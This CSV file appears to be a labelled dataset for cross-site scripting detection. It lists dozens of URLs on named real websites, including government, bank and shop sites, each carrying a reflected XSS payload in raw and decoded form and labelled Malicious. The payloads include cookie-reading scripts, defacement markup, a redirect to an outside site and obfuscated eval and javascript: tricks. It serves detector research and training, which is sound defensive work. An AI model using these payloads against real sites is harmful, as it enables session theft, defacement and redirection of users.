Payloads,Class,decoded,executed,parser_changed
http://www.i-mxms.com/searchresults.aspx?search=aaa%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.i-mxms.com/searchresults.aspx?search=aaa""><script>alert(document.cookie)</script>",True,True
http://www.newsvine.com/_tools/user/login?popoff&amp;redirect=%22%3e%3cscript%3ealert('xss');%3c/script%<br>3e%3c%22,Malicious,"http://www.newsvine.com/_tools/user/login?popoff&redirect=""><script>alert('xss');</script><""",True,True
http://shop.lycos.com/user/search.do?parentid=-358f242a-1143ff68812-220&amp;query=%22%3e%3cscript%3ealer<br>t%281%29%3c%2fscript%3e&amp;submit.x=25&amp;submit.y=8&amp;submit=image,Malicious,"http://shop.lycos.com/user/search.do?parentid=-358f242a-1143ff68812-220&query=""><script>alert(1)</script>&submit.x=25&submit.y=8&submit=image",True,True
http://www.total-knockout.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.total-knockout.com/igallery/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.slavia.cz/sendpass.asp?lostpasswordemail=%3cscript%3ealert('dr.optix')%3c/script%3e&amp;lostp<br>asswordsubmit=send,Malicious,http://www.slavia.cz/sendpass.asp?lostpasswordemail=<script>alert('dr.optix')</script>&lostpasswordsubmit=send,True,True
http://live.sohosai.com/php/showcm_vga.php?name=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%3<br>7%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39<br>%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://live.sohosai.com/php/showcm_vga.php?name="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.flsenate.gov/statutes/index.cfm?app_mode=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.flsenate.gov/statutes/index.cfm?app_mode=""><script>alert(""maxwel"")</script>",True,True
http://www.uydu-shop.com/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.uydu-shop.com/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://www.musictoday.com/login.asp?stroriginalurl=%22%22%3e%3e%3c%3c/script%3e%3cimg%20%22%22%22%3e<br>%3cscript%3ealert(/xss/)%3c/script%3e%22%3e%3e%3c%3cbody%20onload=prompt(document.domain)%3e&amp;strrefe<br>rringurl=&amp;strformaction=submit&amp;stremail=&amp;strpassword=&amp;x=31&amp;y=20,Malicious,"http://www.musictoday.com/login.asp?stroriginalurl="""">><</script><img """"""><script>alert(/xss/)</script>"">><<body onload=prompt(document.domain)>&strreferringurl=&strformaction=submit&stremail=&strpassword=&x=31&y=20",True,True
http://www.web-arama.com/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/scr<br>ipt%3e,Malicious,"http://www.web-arama.com/index.php?cat=3e""><script 
>alert(document.cookie);</script>",True,True
http://www5.yonja.com/messages.jsp?s=0&amp;kt=&quot;&gt;&lt;script&gt;alert(&quot;0ssi3_:d&quot;)&lt;/script&gt;,Malicious,"http://www5.yonja.com/messages.jsp?s=0&kt=""><script>alert(""0ssi3_:d"")</script>",True,True
http://www.aksoftbilgi.com/shop/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script<br>&gt;,Malicious,"http://www.aksoftbilgi.com/shop/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://www.havas.com.tr/tr/search.asp?keyword=%22%3e%3cscript%3ealert(%22jock3r%22)%3c/script%3e,Malicious,"http://www.havas.com.tr/tr/search.asp?keyword=""><script>alert(""jock3r"")</script>",True,True
http://www.merianstiftung.ch/engagements/a-z.cfm?letter=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.merianstiftung.ch/engagements/a-z.cfm?letter=""><script>alert(""maxwel"")</script>",True,True
http://charts.reuters.com/reuters/enhancements/chartapi/chart_api.asp?symbol=06b5pqz%3cscript%3ealer<br>t%28%27xss%27%29%3c/script%3e,Malicious,http://charts.reuters.com/reuters/enhancements/chartapi/chart_api.asp?symbol=06b5pqz<script>alert('xss')</script>,True,True
http://search.state.nj.us/query.html?col=&amp;ht=0&amp;qp=&amp;qs=&amp;qc=&amp;pw=100%25&amp;la=en&amp;charset=iso-8859-1&amp;si=1&amp;w<br>s=0&amp;qm=0&amp;ql=&amp;qt=&lt;script&gt;alert(%22gee+wiz%22)&lt;/script&gt;&amp;oldqt=&lt;script&gt;alert(%22geewiz%22)&lt;/script&gt;,Malicious,"http://search.state.nj.us/query.html?col=&ht=0&qp=&qs=&qc=&pw=100%&la=en&charset=iso-8859-1&si=1&ws=0&qm=0&ql=&qt=<script>alert(""gee wiz"")</script>&oldqt=<script>alert(""geewiz"")</script>",True,True
http://www.bpbfc.banquepopulaire.fr/rechercher.html?banque=bpbfc&amp;titre=bienvenue&amp;mots=%3cscript%3eal<br>ert%28%27xss%27%29%3c%2fscript%3e&amp;parse=%5btype+function%5d&amp;swapplace=%5btype+function%5d&amp;loadimages<br>=%5btype+function%5d&amp;createloader=%5btype+function%5d&amp;imagegen=%5btype+function%5d&amp;randomnum=15&amp;rand<br>omnumlast=15&amp;container%5fmc=%5flevel0%2econtainer&amp;images%5fxml=%3cgallery+timer%3d%225%22+order%3d%2<br>2random%22+fadetime%3d%223%22+looping%3d%22yes%22+xpos%3d%22140%22+ypos%3d%220%22%3e%3cimage+path%3d<br>%22img%2frotation%2fbandeau%5frotation1%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5<br>frotation2%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation3%2ejpg%22+%2f%3e%3c<br>image+path%3d%22img%2frotation%2fbandeau%5frotation4%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotatio<br>n%2fbandeau%5frotation5%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation6%2ejpg<br>%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation7%2ejpg%22+%2f%3e%3cimage+path%3d%22<br>img%2frotation%2fbandeau%5frotation8%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5fro<br>tation9%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation10%2ejpg%22+%2f%3e%3cim<br>age+path%3d%22img%2frotation%2fbandeau%5frotation11%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation<br>%2fbandeau%5frotation12%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation13%2ejp<br>g%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation14%2ejpg%22+%2f%3e%3cimage+path%3d%<br>22img%2frotation%2fbandeau%5frotation15%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5<br>frotation16%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation17%2ejpg%22+%2f%3e%<br>3cimage+path%3d%22img%2frotation%2fbandeau%5frotation18%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frota<br>tion%2fbandeau%5frotation19%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation20%<br>2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation21%2ejpg%22+%2f%3e%3cimage+path<br>%3d%22img%2frotation%2fbandeau%5frotation22%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbande<br>au%5frotation23%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation24%2ejpg%22+%2f<br>%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation25%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2f<br>rotation%2fbandeau%5frotation26%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotatio<br>n27%2ejpg%22+%2f%3e%3cimage+path%3d%22img%2frotation%2fbandeau%5frotation28%2ejpg%22+%2f%3e%3c%2fgal<br>lery%3e&amp;imagearray=%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+objec<br>t%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bob<br>ject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%<br>5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobje<br>ct+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d<br>%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject+object%5d%2c%5bobject<br>+object%5d%2c%5bobject+object%5d&amp;imagedata=%5bobject+object%5d&amp;i=1&amp;thisloader=%5flevel0%2econtainer%<br>2eloader2%5fmc&amp;alphatween=%5btween%5d&amp;timerinterval=7,Malicious,"http://www.bpbfc.banquepopulaire.fr/rechercher.html?banque=bpbfc&titre=bienvenue&mots=<script>alert('xss')</script>&parse=[type function]&swapplace=[type function]&loadimages=[type function]&createloader=[type function]&imagegen=[type function]&randomnum=15&randomnumlast=15&container_mc=_level0.container&images_xml=<gallery timer=""5"" order=""random"" fadetime=""3"" looping=""yes"" xpos=""140"" ypos=""0""><image path=""img/rotation/bandeau_rotation1.jpg"" /><image path=""img/rotation/bandeau_rotation2.jpg"" /><image path=""img/rotation/bandeau_rotation3.jpg"" /><image path=""img/rotation/bandeau_rotation4.jpg"" /><image path=""img/rotation/bandeau_rotation5.jpg"" /><image path=""img/rotation/bandeau_rotation6.jpg"" /><image path=""img/rotation/bandeau_rotation7.jpg"" /><image path=""img/rotation/bandeau_rotation8.jpg"" /><image path=""img/rotation/bandeau_rotation9.jpg"" /><image path=""img/rotation/bandeau_rotation10.jpg"" /><image path=""img/rotation/bandeau_rotation11.jpg"" /><image path=""img/rotation/bandeau_rotation12.jpg"" /><image path=""img/rotation/bandeau_rotation13.jpg"" /><image path=""img/rotation/bandeau_rotation14.jpg"" /><image path=""img/rotation/bandeau_rotation15.jpg"" /><image path=""img/rotation/bandeau_rotation16.jpg"" /><image path=""img/rotation/bandeau_rotation17.jpg"" /><image path=""img/rotation/bandeau_rotation18.jpg"" /><image path=""img/rotation/bandeau_rotation19.jpg"" /><image path=""img/rotation/bandeau_rotation20.jpg"" /><image path=""img/rotation/bandeau_rotation21.jpg"" /><image path=""img/rotation/bandeau_rotation22.jpg"" /><image path=""img/rotation/bandeau_rotation23.jpg"" /><image path=""img/rotation/bandeau_rotation24.jpg"" /><image path=""img/rotation/bandeau_rotation25.jpg"" /><image path=""img/rotation/bandeau_rotation26.jpg"" /><image path=""img/rotation/bandeau_rotation27.jpg"" /><image path=""img/rotation/bandeau_rotation28.jpg"" /></gallery>&imagearray=[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object],[object object]&imagedata=[object object]&i=1&thisloader=_level0.container.loader2_mc&alphatween=[tween]&timerinterval=7",True,True
http://www.funkylab.com/igallery31/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.funkylab.com/igallery31/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.loanuncias.com/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.loanuncias.com/showcategory.php?cid=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://esearch.hakka.gov.tw/hysearch/cgi/m_query.exe?home=home&amp;item_no=10&amp;query=home&amp;group=%2b&amp;check<br>_group=yes&amp;content=hakka}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%<br>22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://esearch.hakka.gov.tw/hysearch/cgi/m_query.exe?home=home&item_no=10&query=home&group= &check_group=yes&content=hakka}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.flerlage.com/404.asp?requested_page=http://www.flerlage.com:80/signinform.php?msg=%22%3e%<br>3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3ebackdoor%3c/h1%3e%3c/marquee%3<br>e&amp;referer=http://www.xssed.com/adm1n/verify.php?id=22963,Malicious,"http://www.flerlage.com/404.asp?requested_page=http://www.flerlage.com:80/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>&referer=http://www.xssed.com/adm1n/verify.php?id=22963",True,True
http://www.nyfa.org/login.asp?id=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,Malicious,"http://www.nyfa.org/login.asp?id=""><script>alert(""cyber"")</script>",True,True
http://www.keijaut.nl/search.asp?a=result&amp;q=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;submit=z<br>oeken,Malicious,"http://www.keijaut.nl/search.asp?a=result&q=""><script>alert(123)</script>&submit=zoeken",True,True
http://www.juniper.net/us/en/search/search.do?searchsubgroup=products-services&amp;qt=%22%3e%3cscript%3e<br>alert(%27xssed%27)%3c/script%3e&amp;submit.x=1&amp;submit.y=9,Malicious,"http://www.juniper.net/us/en/search/search.do?searchsubgroup=products-services&qt=""><script>alert('xssed')</script>&submit.x=1&submit.y=9",True,True
http://www.eskililcesi.net/resimgaleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.eskililcesi.net/resimgaleri/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.buspulling.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.buspulling.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://ancienthistory.about.com/sitesearch.htm?terms=asd&amp;suname=%22%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e,Malicious,"http://ancienthistory.about.com/sitesearch.htm?terms=asd&suname=""><script>alert(document.cookie)</script>",True,True
http://search.msn.nl/results.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://search.msn.nl/results.aspx?q=""><script>alert(document.cookie)</script>",True,True
http://shop.ebay.co.uk/?_from=r40&amp;_npmv=3&amp;_trksid=m38&amp;_nkw=%3cscript%3ealert%28%27seymen%27%29%3b%3c<br>%2fscript%3e&amp;_nd1=see-all-categories,Malicious,http://shop.ebay.co.uk/?_from=r40&_npmv=3&_trksid=m38&_nkw=<script>alert('seymen');</script>&_nd1=see-all-categories,True,True
http://isicad.ru/news.php?news=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;<br>/h1&gt;&lt;/marquee&gt;,Malicious,"http://isicad.ru/news.php?news=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://shopping.indiabigmall.com/v1/indian/catalogue.php?global_search=n&amp;keyword=%22%3e%3cscript%3ea<br>lert(%27cueballr%27)%3c/script%3e,Malicious,"http://shopping.indiabigmall.com/v1/indian/catalogue.php?global_search=n&keyword=""><script>alert('cueballr')</script>",True,True
http://elpub.scix.net/cgi-bin/works/browsetree?field=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://elpub.scix.net/cgi-bin/works/browsetree?field=""><script>alert(""maxwel"")</script>",True,True
http://affiliatopia.com/labs/strgen.php?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://affiliatopia.com/labs/strgen.php?s=""><script>alert(""maxwel"")</script>",True,True
http://amb.vis.ne.jp/mozilla/scrapbook/feature3.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://amb.vis.ne.jp/mozilla/scrapbook/feature3.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.itn.edu.pe/gf/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.itn.edu.pe/gf/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.esaj.net/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.esaj.net/igallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
"http://www.ing.co.jp/cafe/usernew.php?page=2&email=>""><script%20%0a%0d>alert(/xss%20by%20turkpower%20-%20from%20turkey/)%3b</script><h1>xss%20by%20turkpower%20-%20from%20turkey</h1>",Malicious,"http://www.ing.co.jp/cafe/usernew.php?page=2&email=>""><script 
>alert(/xss by turkpower - from turkey/);</script><h1>xss by turkpower - from turkey</h1>",True,True
http://www.locumco.com.au/register.php?show=pharm&amp;tertmenu=%22;%3c/script%3e%3cscript%3ealert(docume<br>nt.cookie);&lt;/script&gt;&lt;script&gt;,Malicious,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",True,True
http://www.gami.com.vn/vn/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.gami.com.vn/vn/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.cyberbeni.com/search/search.php?page=0&amp;query=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscri<br>pt%3e,Malicious,"http://www.cyberbeni.com/search/search.php?page=0&query="">'><script>alert(123)</script>",True,True
http://cimru.nuigalway.ie/content/search.asp?navcontext=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://cimru.nuigalway.ie/content/search.asp?navcontext=""><script>alert(""maxwel"")</script>",True,True
http://www.izmir.bel.tr/searchresults.asp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.izmir.bel.tr/searchresults.asp?keyword=""><script>alert(document.cookie)</script>",True,True
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,Malicious,<img src=javascript:alert('XSS')>,True,True
http://gupea.ub.gu.se/dspace/simple-search?query=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%3e&amp;s<br>ubmit=s%c3%b6k,Malicious,"http://gupea.ub.gu.se/dspace/simple-search?query="">'><script>alert(123)</script>&submit=sök",True,True
http://www2.beppegrillo.it/v2day/vmarcia/vmarcia.php?avatar=123%22%3e%3cscript%3ealert(/xss/)&lt;/scrip<br>t&gt;,Malicious,"http://www2.beppegrillo.it/v2day/vmarcia/vmarcia.php?avatar=123""><script>alert(/xss/)</script>",True,True
http://www.turkstat.gov.tr/kp/kullanici/forgotpassword.do?reqcode=pre%3cscript%3ealert(document.cook<br>ie);%3c/script%3epareforgotpasswordform,Malicious,http://www.turkstat.gov.tr/kp/kullanici/forgotpassword.do?reqcode=pre<script>alert(document.cookie);</script>pareforgotpasswordform,True,True
http://www.qianqian.com/ling/index.php?title=%3e%3c%2fscript%3e%3cscript%3ealert%286%29%3c%2fscript%<br>3e&amp;artist=&amp;mac=&amp;uid=,Malicious,http://www.qianqian.com/ling/index.php?title=></script><script>alert(6)</script>&artist=&mac=&uid=,True,True
http://www.football.com/cgi-bin/posters/printpost.cgi?category=%22%3e%3cscript%3ealert('0ssi3_tr')%3<br>c/script%3e,Malicious,"http://www.football.com/cgi-bin/posters/printpost.cgi?category=""><script>alert('0ssi3_tr')</script>",True,True
http://panorama.ert.gr/archive/31th/31th.asp?id=dsl.wmv&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://panorama.ert.gr/archive/31th/31th.asp?id=dsl.wmv""><script>alert(document.cookie)</script>",True,True
http://www.cmla.org.cn/tuanti_hy.asp?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.cmla.org.cn/tuanti_hy.asp?s=""><script>alert(""maxwel"")</script>",True,True
http://www.carsibesiktas.com/forum/non_rte_javascript.asp?textarea=&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/s<br>cript&gt;,Malicious,http://www.carsibesiktas.com/forum/non_rte_javascript.asp?textarea=<script>alert(/the-sh0ck-b0y/)</script>,True,True
http://www.southerncostaricamap.com/search/search.php?query=&lt;%2ftextarea&gt;'&quot;&gt;&lt;script&gt;alert(document.c<br>ookie)&lt;%2fscript&gt;&amp;search=1,Malicious,"http://www.southerncostaricamap.com/search/search.php?query=</textarea>'""><script>alert(document.cookie)</script>&search=1",True,True
http://e-gazete.anadolu.edu.tr/?i=bolum&amp;no=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://e-gazete.anadolu.edu.tr/?i=bolum&no=1""><script>alert(document.cookie)</script>",True,True
http://www.120.li/search.php?cityid=0&keywords=%22%27/%3e%3c/script%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious,"http://www.120.li/search.php?cityid=0&keywords=""'/></script><script>alert(1)</script>",True,True
http://www.kruechtener-getraenkemarkt.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kruechtener-getraenkemarkt.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.uj.edu.pl/dispatch.jsp?item=zasoby/main.jsp%22%3e%3cscript%3ealert(document.cookie)%3c/sc<br>ript%3e,Malicious,"http://www.uj.edu.pl/dispatch.jsp?item=zasoby/main.jsp""><script>alert(document.cookie)</script>",True,True
http://www.ayvalikturkannelerdernegi.com/news.php?newsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.ayvalikturkannelerdernegi.com/news.php?newsid=""><script>alert(document.cookie)</script>",True,True
http://www.wildandscenicphotos.com/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,Malicious,"http://www.wildandscenicphotos.com/webcards/tools/calendar.php?month=""><script>alert(document.cookie)</script>",True,True
http://www.excite.co.jp/world/chinese/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br>e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;wb_submit=%e3%82%a6%e3%82%a7%e3%83%96%e3%8<br>3%9a%e3%83%bc%e3%82%b8%e7%bf%bb%e8%a8%b3&amp;wb_lp=chja,Malicious,"http://www.excite.co.jp/world/chinese/web/proceeding/?wb_url=http://kusomiso.com/"">'><script>alert(""kusomiso.com"")</script>&wb_submit=ウェブページ翻訳&wb_lp=chja",True,True
http://pam.byu.edu/similarpage.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://pam.byu.edu/similarpage.asp?title=<script>alert(""scriptorium(turkey)"")</script><metahttp-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://www.gptoffers.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.gptoffers.com/members/login.php?path=""><script>alert(document.cookie);</script>",True,True
"<script> 'e1v2a3l'.replace(/(.).(.).(.).(.)/, function(match,$1,$2,$3,$4) { this[$1+$2+$3+$4](/* code to eval() */); }) </script>",Malicious,"<script> 'e1v2a3l'.replace(/(.).(.).(.).(.)/, function(match,$1,$2,$3,$4) { this[$1 $2 $3 $4](/* code to eval() */); }) </script>",True,True
http://www.austin360.com/news/bands/etc/loadartistportalsearch.jspd?searchtype=&quot;&gt;&lt;script&gt;alert(&quot;maxw<br>el&quot;)&lt;/script&gt;,Malicious,"http://www.austin360.com/news/bands/etc/loadartistportalsearch.jspd?searchtype=""><script>alert(""maxwel"")</script>",True,True
http://www.bankofestonia.info/advancedsearch/en/?slice_name=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;,Malicious,"http://www.bankofestonia.info/advancedsearch/en/?slice_name=""><script>alert(""fugitif"")</script>",True,True
http://www.azur-privilege.com/page.php?src=index-ap.html&amp;lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious,"http://www.azur-privilege.com/page.php?src=index-ap.html&lang=fr/""><script>alert('xss byatm0n3r')</script>",True,True
http://www.aa.org/results.cfm?results=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%<br>3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://www.aa.org/results.cfm?results='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.morsepet.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.morsepet.com/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
